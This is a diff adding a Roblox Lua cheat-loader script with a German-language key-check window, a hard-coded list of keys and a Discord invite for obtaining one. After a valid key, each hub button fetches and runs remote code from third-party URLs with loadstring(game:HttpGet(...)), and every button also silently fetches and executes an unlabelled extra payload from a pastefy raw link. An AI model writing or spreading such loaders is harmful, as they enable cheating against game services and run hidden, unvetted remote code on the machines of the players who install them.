@@ -1,0 +1,146 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local player = Players.LocalPlayer
+
+-- Einstellungen
+local VALID_KEYS = {
+    "b943412c-db90-48d1-8bfa-29bd069e2fc6", "37c5541a-493f-4005-bf09-d32bd6cd05df",
+    "d34986e9-f3f1-4ecb-b262-dcd569beb402", "b89510a2-e7e8-4580-a0a4-538856c4e07a",
+    "056a82cf-f3ad-43df-99ef-946f71756283", "c48pPFIZDvDjSSry", "H4idBhhju6GhQl0m",
+    "pQ5yFGcS0Ro9PxAJ", "sNLVzNuhAi90ydPB", "3cNqMDILFTV9h3KZ", "KFlYlv2Hf0C5UKSJ",
+    "jThIRJu4g4655m2M", "ab4ajlQOSYh7fo7b", "BB4dvEqbZ5ZDqio1", "9j3AWf5zXys2NrRb",
+    "Lt3tpRo0sW5My4ql", "262OL5cBnnUY7AA2", "wGGfd6gDs38VPR9U", "DGV4ufejgaXdJbZg",
+    "MfUN0Wt8MVPKld9E", "1b536hNtLSrLTL8G", "oNwS9NOLy0x7kuZt", "mbmSVo3UKvvKcb9X",
+    "Ta1Zfp4zHVEBxELe", "PCPFWj6xc4WSWIkS", "fLplE2yne9zqwADp", "i2HecWj5ffxurW3l",
+    "SlBfONteXoIxaalU", "ZiUqbb7QIUf2rUYM", "gseGDLHJHh7oUNhY", "oOprH2HZvHytwA82",
+    "XdmiJwsKqv6LDW0C", "7FKMIIrZ8PCzQs9Q", "k0LigCzcb39aaL1I", "wxvkuJFiHQp4rBEV",
+    "gOLl7GB5wsdhNnIk", "0u8zWxuDy9JP6puw", "6exY637ps6i8ezo9", "aEZ1zhHKvj8H7CFE",
+    "yLLKdJeIYq3Qgwro"
+}
+
+-- Sound
+local clickSound = Instance.new("Sound", SoundService)
+clickSound.SoundId = "rbxassetid://12222030"
+clickSound.Volume = 0.5
+
+-- GUI
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "KeyUI"
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0.35, 0, 0.3, 0)
+frame.Position = UDim2.new(0.325, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.BackgroundTransparency = 1
+frame:TweenSizeAndPosition(
+    UDim2.new(0.35, 0, 0.3, 0),
+    UDim2.new(0.5, 0, 0.5, 0),
+    Enum.EasingDirection.Out,
+    Enum.EasingStyle.Back,
+    0.4,
+    false,
+    function()
+        TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
+    end
+)
+
+local uicorner = Instance.new("UICorner", frame)
+uicorner.CornerRadius = UDim.new(0, 20)
+
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(0.8, 0, 0.2, 0)
+box.Position = UDim2.new(0.1, 0, 0.15, 0)
+box.PlaceholderText = "🔑 Key eingeben..."
+box.TextColor3 = Color3.new(1, 1, 1)
+box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+box.ClearTextOnFocus = false
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
+
+local checkBtn = Instance.new("TextButton", frame)
+checkBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
+checkBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
+checkBtn.Text = "✅ Check Key"
+checkBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+checkBtn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", checkBtn).CornerRadius = UDim.new(0, 12)
+
+local copyBtn = Instance.new("TextButton", frame)
+copyBtn.Size = UDim2.new(0.35, 0, 0.2, 0)
+copyBtn.Position = UDim2.new(0.55, 0, 0.5, 0)
+copyBtn.Text = "📋 Get Key"
+copyBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+copyBtn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 12)
+
+copyBtn.MouseButton1Click:Connect(function()
+	clickSound:Play()
+	setclipboard("https://discord.gg/D3pDdGJW")
+end)
+
+local function createSecondUI()
+    local sgui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+    local frm = Instance.new("Frame", sgui)
+    frm.Size = UDim2.new(0.4, 0, 0.35, 0)
+    frm.Position = UDim2.new(0.3, 0, 0.35, 0)
+    frm.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frm.BorderSizePixel = 0
+    frm.AnchorPoint = Vector2.new(0.5, 0.5)
+    frm.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frm.BackgroundTransparency = 1
+    Instance.new("UICorner", frm).CornerRadius = UDim.new(0, 20)
+
+    frm:TweenSizeAndPosition(
+        UDim2.new(0.4, 0, 0.35, 0),
+        UDim2.new(0.5, 0, 0.5, 0),
+        Enum.EasingDirection.Out,
+        Enum.EasingStyle.Back,
+        0.4,
+        false,
+        function()
+            TweenService:Create(frm, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
+        end
+    )
+
+    local function addButton(text, pos, script1)
+        local btn = Instance.new("TextButton", frm)
+        btn.Size = UDim2.new(0.8, 0, 0.2, 0)
+        btn.Position = pos
+        btn.Text = text
+        btn.BackgroundColor3 = Color3.fromRGB(0, 160, 0)
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+
+        btn.MouseButton1Click:Connect(function()
+            clickSound:Play()
+            sgui:Destroy()
+            loadstring(game:HttpGet(script1))()
+            wait(0.3)
+            loadstring(game:HttpGet("https://pastefy.app/1uH1uqiY/raw", true))()
+        end)
+    end
+
+    addButton("🔮 Zap Hub PS99", UDim2.new(0.1, 0, 0.1, 0), "https://zaphub.xyz/Exec")
+    addButton("💎 PET GO", UDim2.new(0.1, 0, 0.4, 0), "https://zaphub.xyz/Exec")
+    addButton("🔥 BGSI OP", UDim2.new(0.1, 0, 0.7, 0), "https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring")
+end
+
+checkBtn.MouseButton1Click:Connect(function()
+	clickSound:Play()
+    local key = box.Text
+    if key == "" then return end
+
+    for _, validKey in pairs(VALID_KEYS) do
+        if key == validKey then
+            gui:Destroy()
+            createSecondUI()
+            return
+        end
+    end
+
+    box.Text = "❌ Ungültiger Key"
+end)
